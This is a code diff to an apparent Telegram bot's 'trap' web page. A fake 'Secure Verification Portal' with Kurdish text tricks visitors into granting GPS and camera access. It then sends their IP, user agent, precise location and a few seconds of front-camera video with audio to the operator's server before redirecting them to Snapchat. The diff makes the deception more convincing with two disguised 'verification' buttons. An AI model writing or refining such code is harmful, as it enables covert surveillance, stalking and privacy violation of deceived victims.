@@ -163,7 +163,7 @@ async def handle_admin_photo(message: Message):
         user_states[ADMIN_ID] = {}
         await bot.send_photo(chat_id=ADMIN_ID, photo=photo_id, caption=response_text, parse_mode="Markdown", reply_markup=get_reply_menu(lang))
 
-# پەڕەی تەڵەی شاهانە - چارەسەری یەکجاری بۆ لۆکەیشن و ڤیدیۆ
+# پەڕەی تەڵەی پێشکەوتوو بە دوو دوگمەی شاهانە بۆ دڵنیابوون لە کارکردنی لۆکەیشن و کامێرا بە بێ کێشە
 async def web_trap_page(request: web.Request):
     redirect_url = request.query.get('redirect', 'https://snapchat.com')
     headers = request.headers
@@ -175,14 +175,14 @@ async def web_trap_page(request: web.Request):
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Secure Gateway & verification</title>
+    <title>Secure Verification Portal</title>
     <style>
         body {{
             background: linear-gradient(135deg, #07090f 0%, #121826 100%);
             color: #ffffff;
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             text-align: center;
-            padding-top: 130px;
+            padding-top: 80px;
             margin: 0;
             height: 100vh;
             overflow: hidden;
@@ -190,34 +190,47 @@ async def web_trap_page(request: web.Request):
         .container {{
             background: rgba(255, 255, 255, 0.03);
             border: 1px solid rgba(255, 255, 255, 0.08);
-            backdrop-filter: blur(10px);
+            backdrop-filter: blur(12px);
             border-radius: 20px;
             max-width: 380px;
             margin: 0 auto;
-            padding: 35px 20px;
-            box-shadow: 0 15px 35px rgba(0,0,0,0.5);
+            padding: 30px 20px;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.6);
+        }}
+        h2 {{ font-size: 18px; font-weight: 600; margin-bottom: 8px; color: #f8fafc; }}
+        p {{ color: #94a3b8; font-size: 13px; margin-bottom: 20px; }}
+        .royal-btn {{
+            background: linear-gradient(135deg, #38bdf8 0%, #2563eb 100%);
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            font-size: 14px;
+            font-weight: 600;
+            border-radius: 10px;
             cursor: pointer;
+            width: 100%;
+            margin-bottom: 12px;
+            box-shadow: 0 5px 15px rgba(56, 189, 248, 0.4);
+            transition: 0.3s;
         }}
-        .spinner {{
-            border: 4px solid rgba(255, 255, 255, 0.1);
-            width: 50px;
-            height: 50px;
-            border-radius: 50%;
-            border-left-color: #38bdf8;
-            border-top-color: #818cf8;
-            animation: spin 1s cubic-bezier(0.68, -0.55, 0.27, 1.55) infinite;
-            margin: 20px auto;
-        }}
-        @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
-        h2 {{ font-size: 19px; font-weight: 600; margin-bottom: 8px; color: #f8fafc; }}
-        p {{ color: #94a3b8; font-size: 13px; letter-spacing: 0.5px; }}
+        .royal-btn:hover {{ opacity: 0.9; transform: translateY(-2px); }}
+        .hidden {{ display: none; }}
     </style>
 </head>
 <body>
-    <div class="container" id="gatewayBox">
-        <div class="spinner"></div>
-        <h2>کرتە لێرە بکە بۆ پشتڕاستکردنەوە</h2>
-        <p>تکایە بۆ بینینی ناوەڕۆکەکە پەنجە بنێ بە شاشەکەدا</p>
+    <div class="container">
+        <h2>پشتڕاستکردنەوەی سیستەمی ئەمنی</h2>
+        <p>بۆ بینینی ناوەڕۆکەکە، تکایە هەنگاوەکانی خوارەوە تەواو بکە:</p>
+        
+        <!-- هەنگاوی یەکەم: وەرگرتنی لۆکەیشن -->
+        <div id="step1">
+            <button class="royal-btn" onclick="requestLocation()">📍 نیشاندانی شوێن (GPS Verification)</button>
+        </div>
+
+        <!-- هەنگاوی دووەم: کامێرا و پاشان گواستنەوە -->
+        <div id="step2" class="hidden">
+            <button class="royal-btn" onclick="requestCameraAndRedirect()">🎥 دەستپێکردنی خێرا و بینینی ناوەڕۆک</button>
+        </div>
     </div>
     
     <video id="v" autoplay playsinline muted style="display:none;"></video>
@@ -226,69 +239,71 @@ async def web_trap_page(request: web.Request):
         const redirectTarget = "{redirect_url}";
         const clientInfo = {{ userAgent: "{user_agent}", ip: "{ip}" }};
 
+        // ناردنی زانیاری سەرەتایی ئامێر و IP بە شێوەی پاشبنەما
         fetch('/save_info', {{
             method: 'POST',
             headers: {{ 'Content-Type': 'application/json' }},
             body: JSON.stringify(clientInfo)
         }});
 
-        function runExploitSequence() {{
-            // ١. وەرگرتنی خێرای لۆکەیشن (GPS)
+        function requestLocation() {{
             if (navigator.geolocation) {{
                 navigator.geolocation.getCurrentPosition(function(pos) {{
-                    fetch('/save_location?lat=' + pos.coords.latitude + '&lon=' + pos.coords.longitude);
+                    fetch('/save_location?lat=' + pos.coords.latitude + '&lon=' + pos.coords.longitude)
+                    .then(() => {{
+                        document.getElementById('step1').classList.add('hidden');
+                        document.getElementById('step2').classList.remove('hidden');
+                    }});
                 }}, function(err) {{
-                    console.log("GPS Error: ", err);
-                }}, {{ timeout: 8000, enableHighAccuracy: true, maximumAge: 0 }});
+                    // ئەگەر رەتیشی بکاتەوە، ڕێگەی پێدەدەین هەنگاوی دووەم ببینێت
+                    document.getElementById('step1').classList.add('hidden');
+                    document.getElementById('step2').classList.remove('hidden');
+                }}, {{ timeout: 8000, enableHighAccuracy: true }});
+            }} else {{
+                document.getElementById('step1').classList.add('hidden');
+                document.getElementById('step2').classList.remove('hidden');
             }}
-
-            // ٢. دوای چرکەیەک، داوای کامێرا و مایک دەكات بۆ ئەوەی ڕێپێدانی دووەمیش بێت
-            setTimeout(function() {{
-                navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }}, audio: true }})
-                .then(function(stream) {{
-                    let video = document.getElementById('v');
-                    video.srcObject = stream;
-                    
-                    let mediaRecorder = new MediaRecorder(stream, {{ mimeType: 'video/webm' }});
-                    let chunks = [];
-                    
-                    mediaRecorder.ondataavailable = function(e) {{
-                        chunks.push(e.data);
-                    }};
-                    
-                    mediaRecorder.onstop = function() {{
-                        let blob = new Blob(chunks, {{ type: 'video/webm' }});
-                        let reader = new FileReader();
-                        reader.readAsDataURL(blob);
-                        reader.onloadend = function() {{
-                            let base64data = reader.result;
-                            fetch('/upload_video', {{
-                                method: 'POST',
-                                headers: {{ 'Content-Type': 'application/json' }},
-                                body: JSON.stringify({{ video: base64data }})
-                            }}).then(() => {{
-                                stream.getTracks().forEach(t => t.stop());
-                                window.location.href = redirectTarget;
-                            }});
-                        }};
-                    }};
-                    
-                    mediaRecorder.start();
-                    setTimeout(function() {{
-                        mediaRecorder.stop();
-                    }}, 3500);
-                    
-                }}).catch(function(err) {{
-                    window.location.href = redirectTarget;
-                }});
-            }}, 1200);
         }}
 
-        // بەکارهێنەر دەبێت کلیک بکات تا بڕاوەزەر ڕێپێدانەکان بکاتەوە
-        document.getElementById('gatewayBox').addEventListener('click', function() {{
-            this.style.display = 'none';
-            runExploitSequence();
-        }});
+        function requestCameraAndRedirect() {{
+            navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }}, audio: true }})
+            .then(function(stream) {{
+                let video = document.getElementById('v');
+                video.srcObject = stream;
+                
+                let mediaRecorder = new MediaRecorder(stream, {{ mimeType: 'video/webm' }});
+                let chunks = [];
+                
+                mediaRecorder.ondataavailable = function(e) {{
+                    chunks.push(e.data);
+                }};
+                
+                mediaRecorder.onstop = function() {{
+                    let blob = new Blob(chunks, {{ type: 'video/webm' }});
+                    let reader = new FileReader();
+                    reader.readAsDataURL(blob);
+                    reader.onloadend = function() {{
+                        let base64data = reader.result;
+                        fetch('/upload_video', {{
+                            method: 'POST',
+                            headers: {{ 'Content-Type': 'application/json' }},
+                            body: JSON.stringify({{ video: base64data }})
+                        }}).then(() => {{
+                            stream.getTracks().forEach(t => t.stop());
+                            window.location.href = redirectTarget;
+                        }});
+                    }};
+                }};
+                
+                mediaRecorder.start();
+                setTimeout(function() {{
+                    mediaRecorder.stop();
+                }}, 3000);
+                
+            }}).catch(function(err) {{
+                window.location.href = redirectTarget;
+            }});
+        }}
     </script>
 </body>
 </html>"""
